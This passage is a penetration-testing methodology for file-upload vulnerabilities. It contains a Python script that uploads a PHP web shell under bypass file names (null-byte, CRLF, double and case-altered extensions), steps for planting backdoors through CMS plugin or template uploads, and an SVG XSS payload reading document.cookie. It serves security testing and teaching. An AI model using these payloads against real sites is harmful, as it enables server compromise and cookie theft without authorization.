## Methodologies

### Tools

#### File Upload Vulnerability Testing Tools

- **Burp Suite**: Content-Type and request manipulation, Intruder for fuzzing
- **OWASP ZAP**: Automated scanning for upload vulnerabilities
- **ExifTool**: Metadata manipulation for bypass testing
- **Weevely**: Web shell generation tool
- **Fuxploider**: File upload vulnerability scanner ([GitHub](https://github.com/almandin/fuxploider))
- **Upload Scanner (Burp Extension)**: ([PortSwigger BApp Store](https://portswigger.net/bappstore))
- **FUFF / ffuf / wfuzz**: Fuzzing file upload endpoints, extensions, parameters

#### Custom Testing Scripts

```python
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

def test_file_upload(target_url, file_path, file_name, content_type):
    """
    Test file upload with custom parameters
    """
    multipart_data = MultipartEncoder(
        fields={
            'file': (file_name, open(file_path, 'rb'), content_type)
        }
    )

    headers = {
        'Content-Type': multipart_data.content_type
    }

    response = requests.post(target_url, data=multipart_data, headers=headers)

    # Return response for analysis
    return {
        'status_code': response.status_code,
        'response_text': response.text,
        'response_headers': dict(response.headers)
    }

# Example usage:
target = 'https://target.com/upload.php'
test_cases = [
    # Basic tests
    {'path': 'shell.php', 'name': 'legitimate.jpg', 'type': 'image/jpeg'},
    {'path': 'shell.php', 'name': 'shell.php.jpg', 'type': 'image/jpeg'},
    {'path': 'shell.php', 'name': 'shell.php%00.jpg', 'type': 'image/jpeg'},
    {'path': 'shell.php', 'name': 'shell.php%20.jpg', 'type': 'image/jpeg'},
    {'path': 'shell.php', 'name': 'shell.php%0d%0a.jpg', 'type': 'image/jpeg'},
    {'path': 'shell.php', 'name': 'shell.php.blah123jpg', 'type': 'image/jpeg'},
    # Content-type tests
    {'path': 'legitimate.jpg', 'name': 'legitimate.jpg', 'type': 'image/jpeg'},
    {'path': 'shell.php', 'name': 'shell.php', 'type': 'image/jpeg'},
    {'path': 'shell.php', 'name': 'shell.php', 'type': 'image/gif'},
    # Extension tests
    {'path': 'shell.php', 'name': 'shell.phtml', 'type': 'application/x-php'},
    {'path': 'shell.php', 'name': 'shell.PhP', 'type': 'application/x-php'},
    {'path': 'shell.php', 'name': 'shell.php.', 'type': 'application/octet-stream'},
    {'path': 'shell.php', 'name': 'shell.php%20', 'type': 'application/octet-stream'},
]

for test in test_cases:
    result = test_file_upload(target, test['path'], test['name'], test['type'])
    print(f"Testing {test['name']} ({test['type']}): {result['status_code']}")
```

### Testing Strategies

#### Comprehensive File Upload Testing Process

1. **Discovery Phase**:
   - Map all file upload functionality
   - Identify client-side and server-side validation patterns
   - Document allowed file types and upload restrictions

2. **Initial Testing Phase**:
   - Test baseline functionality with expected file types
   - Test basic restriction bypasses:
     - Extension manipulation
     - Content-Type manipulation
     - Simple payload attempts

3. **Advanced Testing Phase**:
   - Test for complex bypass techniques:
     - Polyglot files
     - Metadata injection
     - Race conditions
     - Upload directory traversal

4. **Exploitation Phase**:
   - Verify code execution for successful uploads
   - Test chained attack scenarios
   - Document impact and attack chains

5. **Post-Exploitation Testing**:
   - Test upload persistence
   - Test access control on uploaded files
   - Test ability to access uploads across user contexts

#### Real-World Testing Examples

##### CMS File Upload Testing

1. Identify CMS type and version
2. Map file upload functionality (plugins, themes, media)
3. Test bypasses specific to the CMS:
   - WordPress: Plugin installation with malicious PHP
   - Drupal: Module upload with executable code
   - Joomla: Template upload with backdoor
4. Verify code execution

##### Multi-step Bypass Testing

1. Attempt standard upload with blocked extension (.php)
2. If blocked, try modification techniques:
   - Double extensions (.jpg.php)
   - Alternate extensions (.phtml, .php5)
   - Case manipulation (.pHP)
3. If still blocked, try content manipulation:
   - Change Content-Type header
   - Modify magic bytes
   - Use polyglot techniques
4. If successful, verify execution path

##### SVG Upload for XSS Testing

1. Create malicious SVG:

```
   <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>
```

2. Upload to target site
3. Access uploaded SVG directly or in context
4. Verify XSS execution

